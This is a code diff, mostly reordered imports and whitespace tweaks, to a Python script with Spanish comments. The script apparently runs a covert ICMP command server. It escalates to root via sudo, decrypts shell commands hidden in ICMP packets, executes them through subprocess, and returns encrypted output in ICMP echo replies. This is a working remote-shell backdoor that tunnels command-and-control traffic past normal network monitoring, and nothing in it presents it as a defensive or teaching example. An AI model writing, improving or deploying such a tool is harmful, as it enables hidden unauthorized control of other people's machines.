@@ -1,13 +1,16 @@
+import hashlib
+import logging
+import os
 import socket
 import struct
 import subprocess
-import hashlib
 import zlib
+from concurrent.futures import ThreadPoolExecutor
+
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
-import logging
-from concurrent.futures import ThreadPoolExecutor
-import os
+
+
 # Verificar y relanzar con sudo si es necesario
 def check_sudo():
     if os.geteuid() != 0:
@@ -35,21 +38,21 @@ def execute_command(command):
 
 def send_icmp_reply(sock, addr, data, key):
     packet_id = os.getpid() & 0xFFFF
-    
+
     # Comprimir y encriptar los datos
     compressed_data = zlib.compress(data.encode())
     encrypted_data = encrypt_data(compressed_data.decode('latin-1'), key)
-    
+
     # Crear el encabezado del ICMP Echo Reply (tipo 0)
     header = struct.pack('bbHHh', 0, 0, 0, packet_id, 1)
     my_checksum = checksum(header + encrypted_data)
     header = struct.pack('bbHHh', 0, 0, socket.htons(my_checksum), packet_id, 1)
     packet = header + encrypted_data
-    
+
     try:
         sock.sendto(packet, addr)
         logging.info(f"Respuesta ICMP enviada a {addr[0]}")
-    except socket.error as e:
+    except OSError as e:
         logging.error(f"Error al enviar el paquete de respuesta: {str(e)}")
 
 def checksum(source_string):
@@ -79,14 +82,14 @@ def handle_packet(packet, addr, key, sock):
             decompressed_data = zlib.decompress(decrypted_data)
             data = decompressed_data.decode().strip()
             logging.info(f"Comando recibido de {addr[0]}: {data}")
-            
+
             if data.lower() == 'exit':
                 logging.info("Comando de salida recibido. Cerrando el servidor...")
                 return False
-            
+
             result = execute_command(data)
             logging.info(f"Resultado: {result}")
-            
+
             # Enviar respuesta al cliente
             send_icmp_reply(sock, addr, result, key)
         except Exception as e:
@@ -127,7 +130,7 @@ def main():
     parser.add_argument('-l', '--log', default='icmp_server.log', help='Archivo de log')
     args = parser.parse_args()
 
-    logging.basicConfig(filename=args.log, level=logging.INFO, 
+    logging.basicConfig(filename=args.log, level=logging.INFO,
                         format='%(asctime)s - %(levelname)s - %(message)s')
 
     key = hashlib.sha256(args.password.encode()).digest()
